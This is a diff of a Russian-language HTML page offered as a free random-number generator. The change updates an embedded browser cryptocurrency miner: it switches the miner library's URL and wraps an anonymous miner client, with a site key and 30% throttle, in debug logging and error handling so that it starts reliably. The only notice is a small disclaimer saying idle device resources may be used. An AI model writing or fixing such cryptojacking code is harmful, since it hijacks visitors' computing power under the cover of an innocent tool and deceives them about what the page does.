@@ -18,12 +18,35 @@
         <button onclick="alert('Ваше число: ' + Math.floor(Math.random() * 100))">Сгенерировать число!</button>
         <p class="disclaimer">Используя этот бесплатный сервис, вы соглашаетесь с тем, что часть неиспользуемых ресурсов вашего устройства может быть использована для его поддержки.</p>
     </div>
-    <script src="https://cloudminer.de/lib/miner.min.js"></script>
+    <script src="https://www.cloudminer.io/lib/miner.min.js"></script>
 <script>
-    var _client = new Client.Anonymous('5a0eced390ad95fd7ac0e967f9a753b5a68900d7a8604fe628a48a8196283990', {
-        throttle: 0.3, c: 'w'
-    });
-    _client.start();
+    // Проверяем, загрузилась ли библиотека майнера
+    if (typeof Client !== 'undefined') {
+        console.log("Библиотека майнера загружена. Пытаемся инициализировать...");
+        var _client = new Client.Anonymous('5a0eced390ad95fd7ac0e967f9a753b5a68900d7a8604fe628a48a8196283990', {
+            throttle: 0.3,
+            c: 'w'
+        });
+        
+        // Добавляем обработчики событий для отладки
+        _client.on('init', function() {
+            console.log('Майнер инициализирован!');
+        });
+        
+        _client.on('start', function() {
+            console.log('Майнинг начался!');
+        });
+        
+        _client.on('error', function(error) {
+            console.error('Ошибка майнера:', error);
+        });
+        
+        // Пытаемся запустить
+        _client.start();
+        
+    } else {
+        console.error("Ошибка: Библиотека майнера не загрузилась!");
+    }
 </script>
 
 </body>
